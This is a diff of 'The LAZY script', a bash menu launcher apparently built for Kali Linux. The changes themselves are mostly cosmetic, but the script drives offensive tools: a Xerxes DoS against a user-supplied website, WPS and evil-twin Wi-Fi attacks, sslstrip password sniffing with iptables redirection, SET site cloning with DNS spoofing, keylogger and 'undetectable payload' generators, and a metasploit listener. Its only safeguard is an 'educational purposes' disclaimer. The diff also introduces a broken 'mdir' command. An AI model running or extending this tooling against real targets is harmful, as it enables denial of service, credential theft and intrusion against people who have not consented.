@@ -1,6 +1,7 @@
 #! /bin/bash
 VERSION=1.8
 #############DEFAULTS###############
+TITLEBAR="The LAZY script"
 #setting yellow-start 
 YS="\e[1;33m"
 #setting color-end
@@ -14,14 +15,17 @@ YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
 PAKT="Press "$YS"any key$CE to"
 PAKTC="Press "$YS"any key$CE to continue..."
 PAKTGB="Press "$YS"any key$CE to go back..."
+READAK="read -n 1 -r"
 #path for lscript
 LPATH="/root/lscript"
+#path for keyboard shortcuts
 KSPATH=""$LPATH"/ks"
-if [ ! -d /root/lscript/ks ]
+#making sure the kspath is set
+if [ ! -d "$KSPATH" ]
 then
-	mkdir /root/lscript/ks
+	mdir "$KSPATH"
 fi
-####################################
+##############FUNCTIONS#############
 function banner
 {
 	echo -e ""
@@ -106,7 +110,7 @@ else
 	echo -e "If you want to change it, type "$YS"interface"$CE" any time"
 	sleep 1
 	echo -e "$PAKTC"
-	read	
+	$READAK	
 fi
 }
 function checkifalready
@@ -196,7 +200,7 @@ then
 		echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
 		echo -e "Done!"
 		echo -e "$PAKTGB"
-		read
+		$READAK
 		clear
 		break
 	else
@@ -206,7 +210,7 @@ then
 		sleep 1
 		echo -e "Done."
 		echo -e "$PAKTGB"
-		read
+		$READAK
 		clear
 		break
 	fi
@@ -318,14 +322,16 @@ function listshortcuts
 }
 
 ####################################
+printf '\033]2;The LAZY script\a'
 if [ "$ONETIMEPERLAUNCH" != "1" ]
 then
 	if [ -d ""$KSPATH"/nums" ]
 	then
-		rm "$KSPATH"/nums/*
-	else
-		mkdir "$KSPATH"/nums
+		rm -r "$KSPATH"/nums
+	#~ else
+		#~ mkdir "$KSPATH"/nums
 	fi
+	mkdir "$KSPATH"/nums
 	nn=1
 	ff=1
 	HOWMANY=0
@@ -385,6 +391,7 @@ var1=1
 		while true
 		do
 		echo -e "-----------------------"$RS"KEYBOARD SHORTCUTS"$CE"------------------------"
+		printf '\033]2;KEYBOARD SHORTCUTS\a'
 		echo -e ""$YS" 1"$CE") Tools"
 		echo -e ""$YS"back"$CE") Go back"
 		#~ echo -e ""$YS"00"$CE") Main menu"
@@ -494,6 +501,7 @@ var1=1
 		while true
 		do
 		echo -e "------------------------------"$RS"TOOLS"$CE"------------------------------"
+		printf '\033]2;TOOLS\a'
 		echo -e ""$YS" 1"$CE") Wifi tools"
 		echo -e ""$YS" 2"$CE") Remote access"
 		echo -e ""$YS"back"$CE") Go back"
@@ -506,6 +514,7 @@ var1=1
 			then
 				while true
 				do
+				printf '\033]2;WIFI TOOLS\a'
 				clear
 				echo -e "---------------------------"$RS"WIFI TOOLS"$CE"----------------------------"
 				echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
@@ -530,6 +539,7 @@ var1=1
 				echo -e ""$YS"19"$CE") Katana Framework   Many penetration testing features"
 				echo -e ""$YS"20"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
 				echo -e ""$YS"21"$CE") Websploit          Wireless attack-multitool"
+				echo -e ""$YS"22"$CE") Openvas            Vulnerability scanner LAN"
 				echo -e ""$YS"back"$CE") Go back"
 				echo -e ""$YS"00"$CE") Main menu"
 				echo -e ""$YS" 0"$CE") EXIT"
@@ -555,7 +565,7 @@ var1=1
 						sleep 1
 						echo -e ""
 						echo -e "$PAKTC"
-						read
+						$READAK
 						clear
 						wifiphisher -nJ
 					else
@@ -650,7 +660,7 @@ var1=1
 						cd /root/xerxes
 						SITEDOSX=www.$SITEDOS
 						echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
-						read
+						$READAK
 						./xerxes $SITEDOSX 80
 					else
 						clear
@@ -662,7 +672,7 @@ var1=1
 				then
 					echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
 					echo -e "Press "$YS"any key"$CE" to start scanning."
-					read
+					$READAK
 					airodump-ng $WLANNM
 					echo -e "Enter your target's BSSID: "
 					read -e MDBSSID
@@ -675,7 +685,7 @@ var1=1
 				elif [ "$APPP" = "18" ]
 				then	
 					echo -e "Press "$YS"any key"$CE" to start scanning with wash."
-					read
+					$READAK
 					gnome-terminal -e 'wash -i $WLANNM'
 					echo -e "Enter your target's BSSID: "
 					read -e MDBSSID
@@ -698,10 +708,25 @@ var1=1
 				elif [ "$APPP" = "21" ]
 				then
 					websploit
+				elif [ "$APPP" = "22" ]
+				then
+					echo -e "Start or stop?("$YS"start"$CE"/"$YS"stop"$CE")"
+					read -e SORS
+					if [ "$SORS" == "start" ]
+					then
+						netstat -nltp
+						openvas-start
+						echo -e "Launching firefox..."
+						sleep 1
+						firefox https://127.0.0.1:9392
+					else
+						openvas-stop
+					fi
 				elif [ "$APPP" = "6" ]
 				then
 					while true
 					do
+					printf '\033]2;OSRFCONSOLE\a'
 					clear
 					echo -e ""$YS" 1"$CE") usufy"
 					echo -e ""$YS" 2"$CE") mailfy"
@@ -776,10 +801,11 @@ var1=1
 				do
 				clear
 				echo -e "-------------------------"$RS"Remote access"$CE"---------------------------"
-				echo -e ""$YS" 1"$CE") BeeLogger	Generate keylogger"
-				echo -e ""$YS" 2"$CE") Ezsploit	Generate payloads for many platforms,listeners etc..."
-				echo -e ""$YS" 3"$CE") Pupy      	Generate payloads for many platforms,listeners etc..."
-				echo -e ""$YS" 4"$CE") Zirikatu		Generate undetectable payloads"
+				printf '\033]2;REMOTE ACCESS\a'
+				echo -e ""$YS" 1"$CE") BeeLogger    Generate keylogger"
+				echo -e ""$YS" 2"$CE") Ezsploit     Generate payloads for many platforms,listeners etc..."
+				echo -e ""$YS" 3"$CE") Pupy         Generate payloads for many platforms,listeners etc..."
+				echo -e ""$YS" 4"$CE") Zirikatu     Generate undetectable payloads"
 				echo -e ""$YS"back"$CE") Go back"
 				echo -e ""$YS"00"$CE") Main menu"
 				echo -e ""$YS" 0"$CE") EXIT"
@@ -806,7 +832,7 @@ var1=1
 					echo -e "set lport 4444"
 					echo -e "exploit"
 					echo -e "Press "$YS"any key"$CE" to leave..."
-					read
+					$READAK
 					exec bash "$0"
 				elif [ "$KEYLOG" = "3" ]
 				then
@@ -1037,7 +1063,7 @@ var1=1
 			echo -e "When monitor mode is enabled, you don't have internet access."
 			echo -e "Select 'd2' to disable monitor mode"
 			echo -e "$PAKTGB"
-			read
+			$READAK
 			clear
 			exec bash "$0"
 		fi
@@ -1056,7 +1082,7 @@ var1=1
 			echo -e "Monitor mode is not enabled."
 			echo -e "Select 'start' or '2' to enable it"
 			echo -e "$PAKTGB"
-			read
+			$READAK
 			clear
 			exec bash "$0"
 		else
@@ -1078,7 +1104,7 @@ var1=1
 			echo -e "Monitor mode is not enabled."
 			echo -e "Select 'start' or '2' to enable it"
 			echo -e "$PAKTGB"
-			read
+			$READAK
 			clear
 			exec bash "$0"
 		else
@@ -1098,7 +1124,7 @@ var1=1
 			echo -e "Monitor mode is not enabled."
 			echo -e "Select 'start' or '2' to enable it"
 			echo -e "$PAKTGB"
-			read
+			$READAK
 			clear
 			exec bash "$0"
 		else
@@ -1112,8 +1138,11 @@ var1=1
 	then
 		clear
 		echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
+		printf '\033]2;MITM\a'
 		echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
 		echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
+		echo -e ""$YS"back"$CE") Go back"
+		echo -e ""$YS" 0"$CE") EXIT"
 		read MITMATT
 		clear
 		if [ "$MITMATT" = "1" ]
@@ -1126,7 +1155,7 @@ var1=1
 			echo -e ""$YS" 2"$CE") Set iptables"
 			echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
 			echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
-			echo -e ""$YS"00"$CE") Main menu"
+			echo -e ""$YS"back"$CE") Go back"
 			echo -e ""$YS" 0"$CE") EXIT"
 			echo -e "Choose: "
 			read -e MITMCH
@@ -1194,7 +1223,7 @@ var1=1
 				done
 				echo -e ""
 				echo -e "$PAKTC"
-				read
+				$READAK
 				export GATENM
 				export GATEINT
 				export TARGIP
@@ -1206,7 +1235,7 @@ var1=1
 				gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
 				sslstrip -l $PORTTCP -w /root/sslstrip.log
 				echo -e "$PAKTGB"
-				read
+				$READAK
 				continue
 			elif [ "$MITMCH" = "33" ]
 			then
@@ -1225,7 +1254,7 @@ var1=1
 				read TARGIP
 				echo -e ""
 				echo -e "$PAKTC"
-				read
+				$READAK
 				export GATENM
 				export GATEINT
 				export TARGIP
@@ -1237,13 +1266,17 @@ var1=1
 				gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
 				sslstrip -l $PORTTCP -w /root/sslstrip.log
 				echo -e "$PAKTGB"
-				read
+				$READAK
 				continue
 			elif [ "$MITMCH" = "4" ]
 			then
 				leafpad /root/sslstrip.log
 			#~ elif [ "$MITMCH" = "44" ]
 			#~ then
+			elif [ "$MITMCH" = "back" ]
+			then
+				clear
+				break
 			elif [ "$MITMCH" = "00" ]
 			then
 				clear
@@ -1266,7 +1299,7 @@ var1=1
 			#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
 			echo -e ""$YS" 4"$CE") Start SEToolkit"
 			echo -e ""$YS" 5"$CE") Start DNSspoofing"
-			echo -e ""$YS"00"$CE") Main menu"
+			echo -e ""$YS"back"$CE") Go back"
 			echo -e ""$YS" 0"$CE") EXIT"
 			echo -e "Choose: "
 			read -e MITMSET
@@ -1344,7 +1377,7 @@ var1=1
 				echo -e "Clone a website to one of the following IP(s):"
 				ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
 				echo -e "$PAKTC"
-				read
+				$READAK
 				gnome-terminal --geometry 66x40+999999+0 -e setoolkit
 			elif [ "$MITMSET" = "5" ]
 			then
@@ -1380,9 +1413,13 @@ var1=1
 				clear
 				echo -e "Starting dnsspoof..."
 				echo -e "$PAKTC"
-				read
+				$READAK
 				export INTIP
 				xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
+			elif [ "$MITMSET" = "back" ]
+			then
+				clear
+				break
 			elif [ "$MITMSET" = "00" ]
 			then
 				clear
@@ -1408,10 +1445,11 @@ var1=1
 		do
 		clear
 		echo -e "---------------------------"$RS"METASPLOIT"$CE"----------------------------"
+		printf '\033]2;METASPLOIT\a'
 		echo -e ""$YS" 1"$CE") Create payload"
 		#~ echo -e ""$YS" 2"$CE") Create payload with zirikatu"
 		echo -e ""$YS" 2"$CE") Start msfconsole"
-		echo -e ""$YS"00"$CE") Main menu"
+		echo -e ""$YS"back"$CE") Go back"
 		echo -e ""$YS" 0"$CE") EXIT"
 		echo -e "Choose: "
 		read -e METASP
@@ -1446,7 +1484,7 @@ var1=1
 			echo -e "Done."
 			echo -e ""
 			echo -e "$PAKTC"
-			read
+			$READAK
 		elif [ "$METASP" = "z" ]
 		then
 			clear
@@ -1464,6 +1502,10 @@ var1=1
 		then
 			clear
 			msfconsole
+		elif [ "$METASP" = "back" ]
+		then
+			clear
+			break
 		elif [ "$METASP" = "00" ]
 		then
 			clear
@@ -1480,6 +1522,7 @@ var1=1
 	elif [ "$YORNAA" = "update" ]
 	then
 		#----------update-check-----------
+		printf '\033]2;UPDATE\a'
 		clear
 		echo -e "Checking for updates..."
 		TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
@@ -1493,7 +1536,7 @@ var1=1
 			echo -e "Current version: $VERSION"
 			echo -e "Updated version: $VER"
 			echo -e "$PAKTC"
-			read
+			$READAK
 			clear
 			echo -e "Do you want to update?"$YNONLY": "
 			read UPDATEYN
@@ -1520,7 +1563,7 @@ var1=1
 				echo -e ""
 				sleep 4
 				echo -e "$PAKTC"
-				read
+				$READAK
 				cd "$LPATH"
 				gnome-terminal -e ./install.sh
 				clear 
@@ -1554,7 +1597,7 @@ var1=1
 			echo -e "Github version:    $VER"
 			sleep 1
 			echo -e "$PAKTGB"
-			read		
+			$READAK	
 			exec bash "$0"
 			fi
 		else
@@ -1564,7 +1607,7 @@ var1=1
 			echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
 			echo -e ""
 			echo -e "$PAKTGB"
-			read
+			$READAK
 			exec bash "$0"
 		fi
 	elif [ "$YORNAA" = "if" ]
@@ -1573,9 +1616,9 @@ var1=1
 	elif [ "$YORNAA" = "changelog" ]
 	then
 		clear
-		cat "$LPATH"/Changel*
+		cat "$LPATH"/Changelog
 		echo -e "$PAKTC"
-		read
+		$READAK
 		clear
 	elif [ "$YORNAA" = "" ]
 	then
@@ -1585,6 +1628,7 @@ var1=1
 	then
 		#---------------------------------------------------------------------------------------------------------------------------
 		echo -e "-----------------------------"$RS"ERRORS"$CE"------------------------------"
+		printf '\033]2;ERRORS\a'
 		echo -e ""$YS" 1"$CE") Fix no audio issue"
 		echo -e ""$YS" 2"$CE") No output in wash"
 		echo -e ""$YS" 3"$CE") No full screen"
@@ -1636,7 +1680,11 @@ var1=1
 			echo -e "Restart your vistual machine..."
 			sleep 2
 			echo -e "$PAKTGB"
-			read
+			$READAK
+		elif [ "$ERRS" = "back" ]
+		then
+			clear
+			break
 		elif [ "$ERRS" = "0" ]
 		then
 			clear
@@ -1726,7 +1774,7 @@ var1=1
 			#~ exec bash "$0"
 		fi
 echo -e "$PAKTGB"
-read
+$READAK
 exec bash "$0"
 #~ echo -e "Choose again?"$YNYES": "
 #~ read -e YORNLAST
@@ -1743,10 +1791,11 @@ exec bash "$0"
 	#~ exit
 #~ fi
 else
+	printf '\033]2;TERMS OF USE\a'
 	echo -e "You need to accept the terms."
 	sleep 1
 	echo -e "$PAKTC"
-	read
+	$READAK
 	clear
 	echo -e "This tool is only for educational purposes only."
 	sleep 2
